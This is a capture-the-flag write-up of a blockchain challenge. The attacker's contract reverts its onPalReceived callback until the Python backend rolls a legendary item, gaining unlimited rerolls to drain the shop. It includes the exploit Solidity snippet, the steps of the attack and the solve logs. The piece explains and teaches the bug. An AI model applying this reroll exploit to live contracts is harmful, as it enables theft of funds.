# PlatyPals — Writeup

## Overview

This was a pretty funny blockchain challenge. We can buy a mystery box for 1 ETH, and a Python backend opens it with a random roll. A legendary pal has only a 1% chance, but we can sell one back for 50 ETH.

The goal is to reduce the shop's balance to less than 10 ETH. It starts with 100 ETH, so getting two legendary pals and selling them is enough (even after paying 2 ETH for the boxes).

At first, I thought it was just about finding a way to manipulate the randomness. But the interesting part was actually the interaction between the Solidity contract and the Python backend.

## Looking at the code

The backend generates random rolls and sends them to `openBoxes()`:

```python
rolls = [secrets.randbelow(100) for _ in range(min(unopened, BATCH_SIZE))]
tx = shop.functions.openBoxes(rolls).buildTransaction({...})
```

The rarity is decided like this:

```solidity
uint8 rarity = rolls[i] == 0 ? LEGENDARY
    : rolls[i] < 10 ? EPIC
    : rolls[i] < 40 ? RARE
    : COMMON;
```

So, `roll == 0` means legendary. The randomness itself comes from Python's `secrets`, and we don't control the backend's roll directly.

However, when the box owner is a contract, `openBoxes()` calls the owner's callback:

```solidity
pals[owner][rarity]++;
emit BoxOpened(id, owner, rarity);

if (owner.code.length > 0) {
    require(
        IPalReceiver(owner).onPalReceived(id, rarity)
            == IPalReceiver.onPalReceived.selector,
        "Pal not accepted"
    );
}
```

This means our contract can see the rarity *before the transaction finishes*. And if our callback reverts, the whole `openBoxes()` transaction reverts too, including the update to `nextUnopened`.

## Wait, why is Python still running?

Here was the moment I noticed something strange.

I was looking at what happens when `onPalReceived()` reverts, and then checked the Python service. Even after the transaction failed, **the Python process was still running and trying again**.

I was like, **"Wait, isn't this bad?"**

The important part of `box_opener.py` is:

```python
while True:
    try:
        unopened = shop.functions.nextBoxId().call() - shop.functions.nextUnopened().call()
        if unopened > 0:
            rolls = [secrets.randbelow(100) for _ in range(min(unopened, BATCH_SIZE))]
            # send openBoxes(rolls) transaction
            # ...
    except Exception:
        logging.exception("Error while opening boxes")
        time.sleep(3)
    time.sleep(0.5)
```

So the failed transaction doesn't consume the box, but it also doesn't stop the backend. On the next loop, Python generates a **new random roll** and tries to open the same box again.

That means we can reject every result we don't like and just wait for a legendary.

We are not predicting the RNG. We are basically getting unlimited rerolls because the backend treats a rejected callback as something to retry.

## Exploit

I made an attacker contract that buys boxes as a contract owner. In `onPalReceived()`, it rejects every rarity except `LEGENDARY` (`3`). When a legendary arrives, it accepts the callback and immediately sells the pal for 50 ETH.

The main logic is very simple:

```solidity
function onPalReceived(
    uint256 boxId,
    uint8 rarity
) external returns (bytes4) {
    require(msg.sender == address(target), "Invalid sender");
    require(rarity == 3, "Not legendary, retry");

    legendaryCount++;
    target.sellLegendary();

    return this.onPalReceived.selector;
}

receive() external payable {}
```

The empty `receive()` is also important because `sellLegendary()` pays with Solidity's `transfer()`.

The attack flow is:

1. Deploy the attacker contract.
2. Buy one box from the attacker contract for 1 ETH.
3. If the backend rolls a non-legendary, `onPalReceived()` reverts and the box stays unopened.
4. The Python backend keeps running and retries with a fresh roll.
5. When it finally rolls legendary, accept it and call `sellLegendary()`.
6. Repeat with a second box.

Buying one box at a time is useful because `openBoxes()` processes a batch in one transaction. If a later box in the same batch rejects its rarity, it would revert the earlier successful openings too.

## Result

I had a few silly problems with transaction signing first. `web3.py` mixed EIP-1559 fields with `gasPrice`, and then I accidentally set `type = 0` explicitly. After removing the conflicting fields and leaving out `type`, deployment finally worked.

The first legendary came pretty quickly:

```text
INFO Attack deployed: 0x76d5d8B7B3aa9455ae80D471F4B07e21ECb6CBf8
INFO STAGE 1/2
INFO Box purchased
INFO Waiting for LEGENDARY #1
INFO LEGENDARY acquired! count=1
INFO Target balance: 51 ETH
INFO Attack balance: 50 ETH

INFO STAGE 2/2
INFO Box purchased
INFO Waiting for LEGENDARY #2
```

Then my RPC connection suddenly dropped with `RemoteDisconnected`. For a moment I thought the exploit had stopped, but this was only my local monitoring script losing its connection. The backend was still doing its job.

I checked the RPC again, then ran a small `resume.py` script to query the already deployed attacker contract and `Setup.isSolved()`. No need to deploy again or buy another box.

```text
2026-11-14 02:45:43,997 INFO Legendary=2/2 | Solved=True

[+] CHALLENGE SOLVED!
[+] Connect with nc and choose 3
```

Nice, the second legendary had already been obtained while I was dealing with the connection error.

The shop's final balance should be:

```text
100 ETH + 2 ETH (box purchases) - 100 ETH (buybacks) = 2 ETH
```

That's below the 10 ETH threshold in `Setup.isSolved()`. I selected option `3 - get flag` in the challenge launcher and got:

```text
PP{r3r0ll_unt1l_l3g3nd4ry::oGSf8KiijNZK}
```

## Takeaway

The bug was not weak randomness. The RNG was fine.

The real problem was that the contract allowed a receiver to reject an unfavorable random outcome, while the off-chain backend automatically retried failed transactions with new randomness.

**A revert rolled back the blockchain state, but not the Python service's decision to keep trying.**

That small mismatch turned a 1% legendary drop into something we could eventually force. Pretty nice example of how on-chain and off-chain logic can be individually reasonable but dangerous when combined.
